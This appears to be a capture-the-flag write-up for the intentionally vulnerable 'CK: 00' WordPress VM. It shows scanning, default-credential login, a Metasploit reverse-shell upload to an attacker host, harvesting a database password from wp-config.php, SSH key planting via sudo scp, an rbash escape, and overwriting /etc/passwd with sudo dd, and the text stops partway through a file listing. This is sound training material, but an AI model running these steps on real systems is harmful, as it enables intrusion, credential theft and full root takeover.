# CK: 00

## Description

> Vulnerable VM to learn Basics of privilege escalation.
Difficulty : Easy
Goal : Your goal will be to get highest privileged user and collect the flag
Virtual box is recommended for configuring CK~00 box
Feel free to contact me at @CyberKnight00.
This works better with VirtualBox rather than VMware
 
## Port Scanning

I started with a simple port as usual which yielded 2 open ports. First, let's focus on port 80 since it has a bigger attack surface.

```
t0thkr1s@darlene:~/Downloads$ sudo nmap -A -Pn -sC -p- 192.168.0.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 09:45 CET
Nmap scan report for 192.168.0.171
Host is up (0.00043s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:6f:64:b5:4c:22:ce:b2:c9:8a:ab:57:0e:69:4a:0f (RSA)
|   256 a8:6f:9c:0e:d2:ee:f8:73:0a:0f:5f:57:1c:2f:59:3a (ECDSA)
|_  256 10:8c:55:d4:79:7f:63:0f:ff:ea:c8:fb:73:1e:21:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.2.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CK~00 &#8211; Just another WordPress site
```

We can see that it is a Wordpress site, so I investigated further.

## WordPress Enumeration

When it comes to Wordpress, my favorite tool is `wpscan`. As much as I like it, this time it wasn't too helpful. The version is outdated and I got a bunch  of vulnerabilities but nothing critical.

```
t0thkr1s@darlene:~$ wpscan --url http://192.168.0.171 -e
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.9
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.0.171/ [192.168.0.171]
[+] Started: Tue Mar 24 10:02:21 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.0.171/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.0.171/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.0.171/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.0.171/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.0.171/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.0.171/, Match: 'WordPress 5.2.2'
 |
 | [!] 16 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9861
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9862
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Potential Open Redirect
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9863
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28
 |
 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9864
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9865
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9908
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9912
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9913
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Improper Access Controls in REST API
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9973
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Stored XSS via Crafted Links
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9975
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Stored XSS via Block Editor Content
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 5.2.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/10004
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <======================================> (325 / 325) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <====================================> (2568 / 2568) 100.00% Time: 00:00:00

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=============================================> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <==================================> (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 49

[+] Finished: Tue Mar 24 10:02:25 2020
[+] Requests Done: 3098
[+] Cached Requests: 4
[+] Data Sent: 776.788 KB
[+] Data Received: 512.744 KB
[+] Memory used: 210.188 MB
[+] Elapsed time: 00:00:03
```

I tried to log in with `admin : admin` credentials on the login page `/wp-admin/admin.php` and I got lucky. Time to capitalize on this!

## Gaining Access

If you are preparing fo OSCP or prefer the manual way, you can edit the 404 page for example and put a PHP reverse shell in there. I was lazy and I used the `wp_admin_shell_upload` Metasploit module.

```
t0thkr1s@darlene:~$ msfconsole

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v5.0.80-dev                          ]
+ -- --=[ 1983 exploits - 1088 auxiliary - 339 post       ]
+ -- --=[ 559 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with irb

msf5 > use wp_admin_shell_upload

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


[*] Using exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > 
...

msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
                                                                                                                                            
Module options (exploit/unix/webapp/wp_admin_shell_upload):                                                                                 
                                                                                                                                            
   Name       Current Setting  Required  Description                                                                                        
   ----       ---------------  --------  -----------                                                                                        
   PASSWORD   admin            yes       The WordPress password to authenticate with                                                        
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.0.171    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   admin            yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.220    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

....
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.0.220:4444 
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/lRaJysGWAz/FqwzvDuDUL.php...
[*] Command shell session 2 opened (192.168.0.220:4444 -> 192.168.0.171:47874) at 2020-03-24 10:30:10 +0100
[+] Deleted FqwzvDuDUL.php
[+] Deleted lRaJysGWAz.php
[+] Deleted ../lRaJysGWAz

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls -la
total 0
cd /home
ls -la
total 20
drwxr-xr-x  5 root  root  4096 Aug  2  2019 .
drwxr-xr-x 23 root  root  4096 Aug  2  2019 ..
drwxr-xr-x  2 bla   bla   4096 Aug  2  2019 bla
drwxr-xr-x  2 bla1  bla1  4096 Aug  2  2019 bla1
drwxr-xr-x  4 ck-00 ck-00 4096 Aug  3  2019 ck
cd ck
ls -la
total 32
drwxr-xr-x 4 ck-00 ck-00 4096 Aug  3  2019 .
drwxr-xr-x 5 root  root  4096 Aug  2  2019 ..
lrwxrwxrwx 1 root  root     9 Aug  2  2019 .bash_history -> /dev/null
-rw-r--r-- 1 ck-00 ck-00  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ck-00 ck-00 3771 Apr  4  2018 .bashrc
drwx------ 2 ck-00 ck-00 4096 Aug  2  2019 .cache
drwx------ 3 ck-00 ck-00 4096 Aug  2  2019 .gnupg
-rw-r--r-- 1 ck-00 ck-00  807 Apr  4  2018 .profile
-rw-r--r-- 1 root  root   103 Aug  3  2019 ck00-local-flag
cat ck00-local-flag
local.txt = 8163d4c2c7ccb38591d57b86c7414f8c

you got local flag
get the root shell and read root flag
```

I could easily read the "local" flag.

> User Flag: 8163d4c2c7ccb38591d57b86c7414f8c

## Privilege Escalation to "bla"

I started looking around the machine and went back to the `/var/www/html/` directory to read the `wp-config.php` file which usually contains sensitive database credentials.

```
ls -la
total 216
drwxr-xr-x  5 www-data www-data  4096 Aug  2  2019 .
drwxr-xr-x  3 root     root      4096 Aug  2  2019 ..
-rw-r--r--  1 www-data www-data   235 Aug  2  2019 .htaccess
-rw-r--r--  1 www-data www-data   420 Nov 30  2017 index.php
-rw-r--r--  1 www-data www-data 19935 Jan  1  2019 license.txt
-rw-r--r--  1 www-data www-data  7447 Apr  8  2019 readme.html
-rw-r--r--  1 www-data www-data  6919 Jan 12  2019 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Jun 18  2019 wp-admin
-rw-r--r--  1 www-data www-data   369 Nov 30  2017 wp-blog-header.php
-rw-r--r--  1 www-data www-data  2283 Jan 21  2019 wp-comments-post.php
-rw-r--r--  1 www-data www-data  2898 Jan  8  2019 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3180 Aug  2  2019 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Mar 24 09:31 wp-content
-rw-r--r--  1 www-data www-data  3847 Jan  9  2019 wp-cron.php
drwxr-xr-x 20 www-data www-data 12288 Jun 18  2019 wp-includes
-rw-r--r--  1 www-data www-data  2502 Jan 16  2019 wp-links-opml.php
-rw-r--r--  1 www-data www-data  3306 Nov 30  2017 wp-load.php
-rw-r--r--  1 www-data www-data 39551 Jun 10  2019 wp-login.php
-rw-r--r--  1 www-data www-data  8403 Nov 30  2017 wp-mail.php
-rw-r--r--  1 www-data www-data 18962 Mar 28  2019 wp-settings.php
-rw-r--r--  1 www-data www-data 31085 Jan 16  2019 wp-signup.php
-rw-r--r--  1 www-data www-data  4764 Nov 30  2017 wp-trackback.php
-rw-r--r--  1 www-data www-data  3068 Aug 17  2018 xmlrpc.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'ck_wp' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'bla_is_my_password' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

....
```

I got the database password and tried to log in as root with SSH. Unfortunately, it didn't work. Then, I tried user bla and to my surprise, it worked.

## Privilege Escalation to "bla1"

By running `sudo -l` you can determine which commands can the user run as root or any other user. This time, we can execute the `/usr/bin/scp` program as bla1 . How can we exploit this?


```
t0thkr1s@darlene:~$ ssh bla@192.168.0.171
bla@192.168.0.171's password: 
Last login: Fri Aug  2 13:35:50 2019 from 192.168.29.253
bla@ck00:~$ sudo -l
[sudo] password for bla: 
Matching Defaults entries for bla on ck00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\

User bla may run the following commands on ck00:
    (bla1) /usr/bin/scp
```

I generated a new SSH key pair for this machine, like this:

```
t0thkr1s@darlene:~/Downloads$ ssh-keygen -f bla1
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in bla1
Your public key has been saved in bla1.pub
The key fingerprint is:
SHA256:L/rdNL1obo0xHAyc76uPzZjPlkc4+VvlS3c2s5kYXgE t0thkr1s@darlene
The key's randomart image is:
+---[RSA 3072]----+
|         . .     |
|          +      |
|           + E   |
|            + .  |
|        S  o + ..|
|         .  O...o|
|        . . o%.=*|
|       . o XOoO+X|
|      ... *OX+o* |
+----[SHA256]-----+
```

Fired up SSH...

```
t0thkr1s@darlene:~/Downloads$ sudo service ssh start
t0thkr1s@darlene:~/Downloads$ sudo service ssh status
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: active (running) since Tue 2020-03-24 10:38:59 CET; 2s ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 13955 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 13956 (sshd)
      Tasks: 1 (limit: 19078)
     Memory: 2.4M
     CGroup: /system.slice/ssh.service
             └─13956 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups

Mar 24 10:38:59 darlene systemd[1]: Starting OpenBSD Secure Shell server...
Mar 24 10:38:59 darlene sshd[13956]: Server listening on 0.0.0.0 port 22.
Mar 24 10:38:59 darlene sshd[13956]: Server listening on :: port 22.
Mar 24 10:38:59 darlene systemd[1]: Started OpenBSD Secure Shell server.
```

and finally, I transferred the public key to the bla1 user's `authorized_keys` file.

```
bla@ck00:~$ sudo -u bla1 /usr/bin/scp t0thkr1s@192.168.0.220:/home/t0thkr1s/Downloads/bla1.pub /home/bla1/.ssh/authorized_keys     
The authenticity of host '192.168.0.220 (192.168.0.220)' can't be established.
ECDSA key fingerprint is SHA256:g626ptplxc2u6oHhURvhEsEnXQTs8mbygf0VFAIqqeU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.220' (ECDSA) to the list of known hosts.
t0thkr1s@192.168.0.220's password: 
bla1.pub    
```

## Privilege Escalation to "ck-00"

I used the corresponding private SSH key to log in as bla1. Again, I ran `sudo -l`.

```
t0thkr1s@darlene:~/Downloads$ ssh -i bla1 bla1@192.168.0.171                                                                                                                                                    
Last login: Fri Aug  2 13:23:25 2019 from 192.168.29.240                                                                                                                                                        
bla1@ck00:~$ ls -la                                                                                                                                                                                             
total 24                                                                                                                                                                                                        
drwxr-xr-x 3 bla1 bla1 4096 Mar 24 09:44 .                                                                                                                                                                      
drwxr-xr-x 5 root root 4096 Aug  2  2019 ..                                                                                                                                                                     
lrwxrwxrwx 1 root root    9 Aug  2  2019 .bash_history -> /dev/null
-rw-r--r-- 1 bla1 bla1  220 Aug  2  2019 .bash_logout
-rw-r--r-- 1 bla1 bla1 3771 Aug  2  2019 .bashrc
-rw-r--r-- 1 bla1 bla1  807 Aug  2  2019 .profile
drwx------ 2 bla1 bla1 4096 Mar 24 09:44 .ssh
bla1@ck00:~$ sudo -l
Matching Defaults entries for bla1 on ck00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bla1 may run the following commands on ck00:
    (ck-00) NOPASSWD: /bin/rbash
```

We are able to run `/bin/rbash` as ck-00 .

## Escaping Restricted Bash

There are a number of ways to escape restricted shells, I chose vim because it's easy and fortunately it was in my `PATH`. The command was `:!/bin/bash` (in vim, of course).

```
bla1@ck00:~$ sudo -u ck-00 /bin/rbash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ck-00@ck00:~$ ls
ck-00@ck00:~$ vim

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ck-00@ck00:~$ id
uid=1000(ck-00) gid=1000(ck-00) groups=1000(ck-00),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Again, I ran `sudo -l` ... and finally, it gave me the output I was waiting for. We can run `/bin/dd` as root!!

```

ck-00@ck00:~$ sudo -l
Matching Defaults entries for ck-00 on ck00:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
​
User ck-00 may run the following commands on ck00:
    (root) NOPASSWD: /bin/dd
```

## Final Privilege Escalation

If you search for dd on GTFBINS, you'll find a handy file write solution which we can use to add a new user to the `/etc/passwd` file.  I used my own tool from the command-line for this: https://github.com/t0thkr1s/gtfo 

```

         __    ___        __    _
  ___ _ / /_  / _/ ___   / /   (_)  ___   ___
 / _ `// __/ / _/ / _ \ / _ \ / /  / _ \ (_-<
 \_, / \__/ /_/   \___//_.__//_/  /_//_//___/
/___/

[ * ] Supplied binary: dd
[ * ] Please wait, loading data ... 

---------- [ FILE-WRITE ] ----------

echo "DATA" | dd of=[file]

---------- [ FILE-READ ] ----------

dd if=[file]

---------- [ SUID ] ----------

echo "DATA" | ./dd of=[file]

---------- [ SUDO ] ----------

echo "DATA" | sudo dd of=[file]

[ * ] Goodbye, friend.
```

I prepared a new user `pwned : pwned` and used dd to overwrite the the original file. Don't forget to add the sudo command before dd , otherwise it won't work.

```
ck-00@ck00:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ck-00:x:1000:1000:CyberKnight:/home/ck:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
bla1:x:1001:1001:Bla 1,01,0000,0001:/home/bla1:/bin/bash
bla:x:1002:1002:bla,0000,0000,0000:/home/bla:/bin/bash
ck-00@ck00:~$ cd /tmp
ck-00@ck00:/tmp$ vim passwd
ck-00@ck00:/tmp$ cat passwd | sudo dd of=/etc/passwd
3+1 records in
3+1 records out
1862 bytes (1.9 kB, 1.8 KiB) copied, 0.00154877 s, 1.2 MB/s
ck-00@ck00:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
